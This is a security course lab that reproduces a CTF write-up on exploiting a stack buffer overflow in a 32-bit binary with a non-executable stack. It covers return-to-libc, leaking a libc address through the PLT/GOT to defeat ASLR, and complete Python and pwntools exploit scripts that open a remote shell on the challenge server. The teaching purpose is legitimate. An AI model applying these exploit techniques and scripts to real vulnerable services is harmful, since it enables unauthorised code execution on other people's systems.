# Lab 11: Return-to-libc & Return Oriented Programming

> Reference https://duroz.github.io/post/247ctf-pwn-non-executable-stack/
>
> By Daniel Uroz

In this post, we’ll cover how to exploit a stack-based buffer overflow, this time with the stack marked as non-executable. We first detail how to manually exploit the binary locally and then in the remote server. In the end, we’ll use the Python library [pwntools](https://github.com/Gallopsled/pwntools) to speed up exploit development.

## Challenge

This time, [247/CTF](https://247ctf.com/) gives us a binary called `non_executable_stack` with the following description:

> There are no hidden flag functions in this binary. Can you make your own without executing from the stack?

And here is an example of execution flow:

```shell
$ ./non_executable_stack 
Enter the secret password:
kk
Incorrect secret password!
```

It’s an ELF 32-bit as in previous pwn challenges, but this time with [NX bit](https://en.wikipedia.org/wiki/NX_bit) enables to make stack segment (and any other) writable but not executable:

```shell
$ checksec non_executable_stack
[*] '/home/urzu/247ctf/pwn/non_executable_stack'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

This `checksec` version is the one coming with pwntools (you can install it with `python3 -m pip install pwntools`), there is also a [Bash script](https://github.com/slimm609/checksec.sh) with the same functionality.

## Background

If we analyze the binary, we can quickly spot the use of the `gets` function to retrieve the password, so we can overflow the buffer due to no outbounds checking of the function:

```x86asm
$ r2 non_executable_stack 
-- Virtual machines are great, but you lose the ability to kick the hardware.
[0x080483c0]> aa
[x] Analyze all flags starting with sym. and entry0 (aa)                   
[0x080483c0]> s sym.chall 
[0x080484d6]> pdf
            ; CALL XREF from main @ 0x804857f
┌ 103: sym.chall ();
│           ; var int32_t var_28h @ ebp-0x28
│           ; var int32_t var_4h @ ebp-0x4
│           0x080484d6      55             push ebp
│           0x080484d7      89e5           mov ebp, esp
│           0x080484d9      53             push ebx
│           0x080484da      83ec24         sub esp, 0x24
[... redacted ...]
│           0x080484eb      8d45d8         lea eax, [var_28h]
│           0x080484ee      50             push eax
│           0x080484ef      e88cfeffff     call sym.imp.gets           ; char *gets(char *s) <--- buffer overflow
[... redacted ...]
│      │    0x08048528      8d833de6ffff   lea eax, [ebx - 0x19c3]
│      │    0x0804852e      50             push eax
│      │    0x0804852f      e85cfeffff     call sym.imp.puts           ; int puts(const char *s)
│      │    0x08048534      83c410         add esp, 0x10
│      │    ; CODE XREF from sym.chall @ 0x8048523
│      └──> 0x08048537      90             nop
│           0x08048538      8b5dfc         mov ebx, dword [var_4h]
│           0x0804853b      c9             leave
└           0x0804853c      c3             ret
[0x080484d6]>
```

This problem is that, whereas in previous challenges we could execute our payload directly into the stack, this time NX bit is preventing us to do so. Still, we can overwrite the return based stored in the stack to control the program flow, so why don’t use the code already residing in executable segments for our purpose? This is the main idea behind [Return-to-libc attack](https://en.wikipedia.org/wiki/Return-to-libc_attack) and [Return-oriented programming](https://en.wikipedia.org/wiki/Return-oriented_programming).

### Return-to-libc

This attack relies on using code marked as executable contained in the `libc` shared library. `libc` provides a runtime environment to C programs, so it is usually loaded into the memory of most processes. In this binary, we can see that it will effectively be loaded thanks to:

```shell
$ ldd non_executable_stack 
linux-gate.so.1 (0xf7fd2000)
libc.so.6 => /lib32/libc.so.6 (0xf7dd4000)
/lib/ld-linux.so.2 (0xf7fd4000)
```

`libc` provides a lot of functions like `printf`, `scanf`, `fopen`, and so on. Thus, if we can execute the `system` function (which executes a shell command) with the `/bin/sh` parameter, we’ll be able to prompt an interactive shell.

## Local exploit

We’re going to develop a local version of the exploit and, to make it easier, we’re going to deactivate [ASLR protection](https://en.wikipedia.org/wiki/Address_space_layout_randomization) of our system:

```shell
$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
0
```

Firstly, we can obtain the necessary padding to overwrite the return address by placing a breakpoint just before the `ret` instruction (`0x0804853c` in the code above) and seeing where is our input:

```shell
$ r2 -d non_executable_stack
Process with PID 2381 started...
= attach 2381 2381
bin.baddr 0x08048000
Using 0x8048000
asm.bits 32
glibc.fc_offset = 0x00148
    -- Most likely your core dump fell into a blackhole, can't see it.
[0xf7fd50b0]> aa
[x] Analyze all flags starting with sym. and entry0 (aa)
[0xf7fd50b0]> db 0x0804853c
[0xf7fd50b0]> dc
Enter the secret password:
kk
Incorrect secret password!
hit breakpoint at: 804853c
[0x0804853c]> px -0x2c @ esp
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0xffffd1d0  6b6b 00ff 9096 fef7 90f8 faf7 00a0 0408  kk..............
0xffffd1e0  00e0 faf7 00e0 faf7 08d2 ffff 7c85 0408  ............|...
0xffffd1f0  5886 0408 00a0 0408 08d2 ffff            X...........
[0x0804853c]>
```

Our input starts `0x2c` before, so this is the amount of padding we need to provide and, then, the return address of the function we want to execute (`system` in this case). In addition, thanks to deactivating ASLR, `libc` will be loaded in the same base address during multiple executions (`0xf7dd4000` in the example):

```shell
[0x0804853c]> dmm
0x08048000 0x08049000  /home/urzu/247ctf/pwn/non_executable_stack
0xf7dd4000 0xf7ded000  /usr/lib32/libc-2.28.so
0xf7fd4000 0xf7fd5000  /usr/lib32/ld-2.28.so
[0x0804853c]> ood
PTRACE_CONT: No such process
child received signal 9
Process with PID 2337 started...
= attach 2337 2337
File dbg:///home/urzu/247ctf/pwn/non_executable_stack  reopened in read-write mode
2337
[0xf7fd50b0]> dc
Enter the secret password:
kk
Incorrect secret password!
[0xf7fd3069]> dmm
0x08048000 0x08049000  /home/urzu/247ctf/pwn/non_executable_stack
0xf7dd4000 0xf7ded000  /usr/lib32/libc-2.28.so
0xf7fd4000 0xf7fd5000  /usr/lib32/ld-2.28.so
[0xf7fd3069]>
```

So, our payload would look something like this (the dummy address is explained a bit below):

```
[0x2c padding] + [system address] + [dummy address] + [/bin/sh address]
```

We can obtain the function RVA with the following:

```shell
$ rabin2 -s /usr/lib32/libc-2.28.so | grep -w system
1525  0x0003e9e0 0x0003e9e0 WEAK   FUNC   55        system
```

And the string offset (like an RVA) inside the library thanks to:

```shell
$ strings -t x /usr/lib32/libc-2.28.so | grep /bin/sh
17eaaa /bin/sh
```

As we already know that `libc` will be loaded in `0xf7dd4000` address, we can add those RVA to the base address to obtain the following payload:

```
[0x2c padding] + [0xf7e129e0] + [dummy address] + [0xf7f52aaa]
```

We can check that we effectively calculate the absolute address right with radare2:

```shell
[0xf7f3b000]> dmi libc system
257   0x0012a2c0 0xf7efe2c0 GLOBAL FUNC   102       svcerr_systemerr
658   0x0003e9e0 0xf7e129e0 GLOBAL FUNC   55        __libc_system
1525  0x0003e9e0 0xf7e129e0 WEAK   FUNC   55        system
[0xf7f3b000]> / /bin/sh
Searching 7 bytes in [0xf7f3b000-0xf7fab000]
hits: 1
0xf7f52aaa hit5_0 .b/strtod_l.c-c/bin/shexit 0canonica.
```

If we try our exploit, we can effectively obtain an interactive shell (the cat command is to maintain program stdin open and feed non_executable_stack with our commands):

```shell
$ (python2 -c 'print("A"*0x2c + "\xe0\x29\xe1\xf7" + "A"*4 + "\xaa\x2a\xf5\xf7")' && cat) | ./non_executable_stack    
Enter the secret password:
Incorrect secret password!
whoami
urzu
```

### Stack frame

So, why do we need a dummy address between our function call and the parameter? This is due to how stack frames are constructed during function calls. We’ll see it with a simple C example:

```c
#include <stdio.h>

int main(int argc, char** argv) {
    puts("Hello World!");
    return 0; 
}
```

Okay, so if we analyze the compiled binary (`gcc -o test.out -m32 -no-pie test.c`) with radare2, we'll see that the parameter `"Hello World!"` is passed into the stack at line `0x08049184`:

```x86asm
│           0x0804917e      8d9008e0ffff   lea edx, [eax - 0x1ff8]
│           0x08049184      52             push edx
│           0x08049185      89c3           mov ebx, eax
│           0x08049187      e8a4feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x0804918c      83c410         add esp, 0x10
```

After executing `0x08049184`, the stack looks like this:

```shell
|       ...       |
|-----------------|
| @"Hello World!" |
|-----------------|
|       ...       |
```

Now, the function call at `0x08049187` will push the return address into the stack, so after the `puts` function ends doing its magic, the execution flow of our program will continue as if nothing happened. This means that when `puts` start to execute, it will see the stack as this:

```
|       ...       |
|-----------------|
|    0x0804918c   | <--- return address of the caller
|-----------------|
| @"Hello World!" |
|-----------------|
|       ...       |
```

This return address is exactly our dummy address from our payload. So, in our payload, after the shell finished executing, the binary will probably crash as the program will change execution flow to `0x41414141` and very likely nothing valid is there. Therefore, we can change our dummy address with the address of the exit function (calculated the same way that `system` function above) to produce a clean exit of the program:

```
[0x2c padding] + [0xf7e129e0] + [0xf7e03a60] + [0xf7f52aaa]
```

## Remote exploit

Well, now we know how to exploit the binary locally, but we need to consider two aspects to exploit it in the server:

- We need to assume that ASLR will be activated.
- We don’t know which version of `libc` is installed.

To overcome the two limitations, we can use a `libc` function leakage.

### PLT and GOT

You can read more in detail in [this blog](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html), but we only need to know a general idea. When a dynamic linked binary is using an external function (like `libc` `puts`), your code can’t reference an absolute address of the library because this will change after each execution (due to ASLR) and it won’t be portable (different version of `libc` will have that function in different locations).

So, to overcome this issue, your code reference to another section within your binary, the Procedure Linkage Table (PLT). This section is responsible for either triggering linker resolution of the target function (due to [lazy binding](http://www.qnx.com/developers/docs/qnxcar2/index.jsp?topic=%2Fcom.qnx.doc.neutrino.prog%2Ftopic%2Fdevel_Lazy_binding.html)) or jumping to the target function if it was already resolved. The latter is stored in the Global Offset Table (GOT) section, which is the actual table of offsets as filled in by the linker for external symbols.

You can see how `non_executable_stack` reference to the PLT in the code:

```x86asm
[0x080484d6]> pdf
[... redacted ...]
│      │    0x08048528      8d833de6ffff   lea eax, [ebx - 0x19c3]
│      │    0x0804852e      50             push eax
│      │    0x0804852f      e85cfeffff     call sym.imp.puts           ; int puts(const char *s)
[... redacted ...]
```

If we see the content of that address, we can see that there is another jump:

```x86asm
[0x080484d6]> s sym.imp.puts
[0x08048390]> pd 1
            ; CALL XREFS from sym.chall @ 0x804851b, 0x804852f
            ; CALL XREF from main @ 0x8048577
┌ 6: int sym.imp.puts (const char *s);
│ bp: 0 (vars 0, args 0)
│ sp: 0 (vars 0, args 0)
│ rg: 0 (vars 0, args 0)
└           0x08048390      ff2518a00408   jmp dword [reloc.puts]      ; 0x804a018
```

If we go to that address, we’ll see that there is another reference to the binary itself, this is the PLT stub responsible to resolve the address of the external symbol, so puts haven’t been invoked yet:

```x86asm
[0x08048390]> s reloc.puts
[0x0804a018]> pd 1
            ; DATA XREF from sym.imp.puts @ 0x8048390
            ;-- reloc.puts:
            0x0804a018      .dword 0x08048396                          ; RELOC 32 puts
```

If we continue execution to force `puts` resolution, now we can see that now the GOT is pointing to the actual offset in memory:

```x86asm
[0x0804a018]> dc
Enter the secret password:
kk
Incorrect secret password!
[0xf7fd3069]> s -
[0x0804a018]> pd 1
            ; DATA XREF from sym.imp.puts @ 0x8048390
            ;-- reloc.puts:
            0x0804a018      .dword 0xf7e3b0a0                          ; RELOC 32 puts
[0x0804a018]> dmi libc puts
[... redacted ...]
458   0x000690a0 0xf7e3b0a0 WEAK   FUNC   416       puts
[... redacted ...]
[0x0804a018]>
```

### `libc` leakage

With all of this in mind, we can construct our payload the same way as before, but instead, to reference the absolute address of the functions, we can use the address of the PLT known functions. We can use this technique only because the binary isn’t a [Position Independent Executable (PIE)](https://en.wikipedia.org/wiki/Position-independent_code) and we can reference the absolute value of the PLT as we know where the binary will be mapped during execution (base address `0x8048000`).

So, in this case, our payload will be like this:

```
[0x2c padding] + [puts@plt] + [dummy address] + [puts@got]
```

This time, we’re calling the `puts@plt` at `0x08048390` with the `puts@got` at `0x0804a018` as a parameter (which it’ll be sent to us as a string):

```
[0x2c padding] + [0x08048390] + [dummy address] + [0x0804a018]
```

If we try our newly crafted payload:

```shell
$ python2 -c 'print("A"*0x2c + "\x90\x83\x04\x08" + "A"*4 + "\x18\xa0\x04\x08")' | nc ad520e503a0ec4e0.247ctf.com 50341 | xxd
00000000: 456e 7465 7220 7468 6520 7365 6372 6574  Enter the secret
00000010: 2070 6173 7377 6f72 643a 0a49 6e63 6f72   password:.Incor
00000020: 7265 6374 2073 6563 7265 7420 7061 7373  rect secret pass
00000030: 776f 7264 210a 60d3 dbf7 90ed d6f7 0a    word!.`........
```

So, now we know that `puts` in the server is placed at `0xf7dbd360` address. With this information, we can search a [libc database](https://libc.blukat.me/) to download this specific version (`libc6-i386_2.27-3ubuntu1_amd64`). In case that address matches different versions, we can leak other addresses as `gets` or `strcmp` to limit the results.



![libc database result](https://duroz.github.io/post/247ctf-pwn-non-executable-stack/libc-version_hu4695770a2e6f2b76e5e2e618435ba63b_43837_92f850fdc407dbf60aaa066543a0d4b6.webp)



If we run again our Python command with the payload, we’ll see that this time `puts` address is different, so we can confirm that the remote server has ALSR activated.

### Payload construction

The main problem here is that we need to know the base address of the `libc` library to construct our payload. We can obtain it thanks to the `puts` address leakage:

```
[libc base adddress] = [puts address leaked] - [libc6-i386_2.27-3ubuntu1_amd64.puts RVA]
```

But if we provide a dummy address to the payload, the remote program will crash, and in the next execution, the base address will be different. So, we can provide the `main` address to continue execution and interact again with the program and the vulnerable gets function to overwrite again the return address, this time with the first payload we described earlier, but instead of referencing the absolute addresses, we can use them as:

```
[function VA] = [libc base address] + [function RVA]
```

Be aware that the second padding of the payload may change, so you need to recalculate it again, but we’re lucky enough and this time the padding is the same. With all of this in mind, here is what our final script would look like:

```python
import socket
import struct

hostname = 'ad520e503a0ec4e0.247ctf.com'
port = 50341

conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    # TCP socket
conn.connect((hostname, port))

print('[*] Connected to {}:{}'.format(hostname, port))

conn.recv(1024)

payload = b'A' * 0x2c
payload += struct.pack('<I', 0x08048390)    # puts@plt
payload += struct.pack('<I', 0x0804853d)    # main
payload += struct.pack('<I', 0x0804a018)    # puts@got
conn.sendall(b'%b\r\n' % payload)
print('[*] Payload sent: {}B'.format(len(payload)))

data = conn.recv(1024).split(b'\n')[1]
puts_leak = struct.unpack('<I', data[:4])[0]
print('[*] puts leaked address: {:#x}'.format(puts_leak))

libc_base = puts_leak - 0x67360
print('[*] libc base address: {:#x}'.format(libc_base))

libc_system = libc_base + 0x3cd10
libc_exit = libc_base + 0x2ff70
libc_shell = libc_base + 0x17b8cf

payload = b'A' * 0x2c
payload += struct.pack('<I', libc_system)
payload += struct.pack('<I', libc_exit)
payload += struct.pack('<I', libc_shell)
conn.sendall(b'%b\r\n' % payload)
print('[*] Payload sent: {}B'.format(len(payload)))
conn.recv(1024)

print('[*] Interactive shell\n')

try:
    command = input('$ ')

    while command != 'exit':
        conn.sendall('{}\n'.format(command).encode('utf-8'))
        print(conn.recv(1024).decode('utf-8'), end='')
        command = input('$ ')
except (EOFError, KeyboardInterrupt):
    pass

conn.close()
```

And an execution trace:

```shell
$ python3 exploit-remote.py
[*] Connected to ad520e503a0ec4e0.247ctf.com:50341
[*] Payload sent: 56B
[*] puts leaked address: 0xf7d5d360
[*] libc base address: 0xf7cf6000
[*] Payload sent: 56B
[*] Interactive shell

$ ls
chall
flag_[0-9]+.txt
$ cat flag_[0-9]+.txt
247CTF{[a-f0-9]{32}}
$ exit
```

## pwntools

This blog post is already long enough, so I’ll only show how `exploit-remote.py` script looks when ported to pwntools. I’ll leave all details up to you but the library is pretty straightforward:

```python
import pwn

hostname = 'ad520e503a0ec4e0.247ctf.com'
port = 50341

io = pwn.remote(hostname, port)

elf = pwn.ELF('non_executable_stack')
libc = pwn.ELF('libc6-i386_2.27-3ubuntu1_amd64.so')

payload = b'A' * 0x2C
payload += pwn.p32(elf.plt['puts'])
payload += pwn.p32(elf.symbols['main'])
payload += pwn.p32(elf.got['puts'])

io.recvline()
io.sendline(payload)
pwn.log.info('Payload sent: {}B'.format(len(payload)))
io.recvline()
puts_leak = pwn.u32(io.recvline()[:4])
pwn.log.info('puts leaked address: {:#x}'.format(puts_leak))

libc_base = puts_leak - libc.symbols['puts']
pwn.log.info('libc base address: {:#x}'.format(libc_base))
libc_system = libc_base + libc.symbols['system']
libc_exit = libc_base + libc.symbols['exit']
libc_shell = libc_base + next(libc.search(b'/bin/sh\x00'))

payload = b'A' * 0x2C
payload += pwn.p32(libc_system)
payload += pwn.p32(libc_exit)
payload += pwn.p32(libc_shell)

io.recvline()
io.sendline(payload)
pwn.log.info('Payload sent: {}B'.format(len(payload)))
io.recvline()
io.interactive()
```

## Assignment

### Believe in the ROP

A tutorial to the ROP.

[Attachment](static/7ab001b7c25077c1b02f071a56f6ffc5.zip)

### List

Do you know return to libc?

[Attachment](static/51db1d4bd7c1413265556a89ec92881a.zip)